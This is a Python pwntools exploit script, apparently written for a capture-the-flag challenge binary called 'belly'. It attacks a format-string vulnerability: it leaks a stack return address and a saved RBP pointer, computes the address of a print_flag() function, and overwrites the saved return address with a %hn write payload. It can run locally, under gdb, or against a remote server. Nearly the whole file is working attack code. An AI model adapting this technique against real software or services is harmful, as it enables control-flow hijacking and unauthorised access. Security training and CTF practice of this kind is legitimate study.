#!/usr/bin/env python3
from pwn import *
import re
import sys

# Load the target binary for analysis
target_elf = ELF("./belly")

# Command line argument handling for different connection modes
def setup_connection():
    if len(sys.argv) > 1:
        if "remote" in sys.argv:
            if len(sys.argv) > 3:
                return remote(sys.argv[2], sys.argv[3])
            else:
                print('usage: ./dumbledore_genius.py remote <server> <port>')
                exit(1)
        elif "gdb" in sys.argv:
            proc = target_elf.process()
            gdb.attach(proc)
            return proc
    return target_elf.process()

def analyze_binary():
    """Analyze the binary to understand the exploitation strategy"""
    print("[*] Binary Analysis:")
    print(f"[*] Architecture: {target_elf.arch}")
    print(f"[*] Entry point: {hex(target_elf.entry)}")
    
    # Look for interesting functions
    if 'print_flag' in target_elf.symbols:
        print(f"[*] print_flag() found at: {hex(target_elf.symbols['print_flag'])}")
    if 'main' in target_elf.symbols:
        print(f"[*] main() found at: {hex(target_elf.symbols['main'])}")
    
    # Check security mitigations
    print(f"[*] NX: {target_elf.nx}")
    print(f"[*] PIE: {target_elf.pie}")
    print(f"[*] Canary: {target_elf.canary}")

def exploit():
    """Main exploitation function"""
    target_proc = setup_connection()
    
    print("[*] Starting format string exploitation...")
    
    # Step 1: Leak return address to main()
    print("[*] Step 1: Leaking return address...")
    target_proc.recvuntil(b'Try Shouting:')
    target_proc.sendline(b'%21$p')  # Format string to leak stack value at offset 21
    target_proc.recvline()  # consume newline
    
    ret_to_main_leak_line = target_proc.recvline()
    ret_to_main_hex_match = re.search(b"0x[0-9a-f]+", ret_to_main_leak_line)
    
    if not ret_to_main_hex_match:
        print("[-] Failed to leak return address")
        return
    
    ret_to_main_address = int(ret_to_main_hex_match.group(), 16)
    print(f'[+] Return to main() address: {hex(ret_to_main_address)}')
    
    # Step 2: Leak saved RBP (stack frame pointer)
    print("[*] Step 2: Leaking saved RBP...")
    target_proc.sendline(b'%20$p')  # Format string to leak RBP at offset 20
    
    rbp_leak_line = target_proc.recvline()
    rbp_hex_match = re.search(b"0x[0-9a-f]+", rbp_leak_line)
    
    if not rbp_hex_match:
        print("[-] Failed to leak RBP")
        return
    
    rbp_of_main_address = int(rbp_hex_match.group(), 16)
    print(f'[+] Saved RBP (main stack frame): {hex(rbp_of_main_address)}')
    
    # Step 3: Calculate target addresses
    print("[*] Step 3: Calculating exploitation addresses...")
    
    # The return address is stored 8 bytes before the saved RBP
    ret_to_main_stack_addr = rbp_of_main_address - 0x8
    print(f'[+] Return address location on stack: {hex(ret_to_main_stack_addr)}')
    
    # Calculate print_flag() address based on leaked main address
    # The original offset was 0x1AA, but you may need to adjust this
    target_function_offset = 0x1AA  # Adjust based on disassembly
    target_address = ret_to_main_address - target_function_offset
    print(f'[+] Target function address: {hex(target_address)}')
    
    # Step 4: Format string write to overwrite return address
    print("[*] Step 4: Overwriting return address with format string...")
    
    # We're using %hn to write a 2-byte (short) value
    # This technique works when ASLR is enabled but only affects higher bits
    target_short_value = target_address & 0xFFFF
    
    # Construct the format string payload
    # %Nx writes N characters, %8$hn writes the character count to the 8th argument
    payload = b'%' + str(target_short_value).encode() + b'x%8$hn'
    
    # Pad to maintain 8-byte alignment
    padding_needed = 16 - len(payload)
    if padding_needed > 0:
        payload += b'.' * padding_needed
    
    # Add the address we want to write to (8th argument position)
    payload += p64(ret_to_main_stack_addr)
    
    print(f"[*] Payload length: {len(payload)} bytes")
    print(f"[*] Sending payload...")
    
    target_proc.sendline(payload)
    target_proc.sendline(b'exit')  # Trigger return
    
    print("[*] Exploitation complete! Switching to interactive mode...")
    target_proc.interactive()

def main():
    """Main function with error handling"""
    try:
        analyze_binary()
        exploit()
    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()

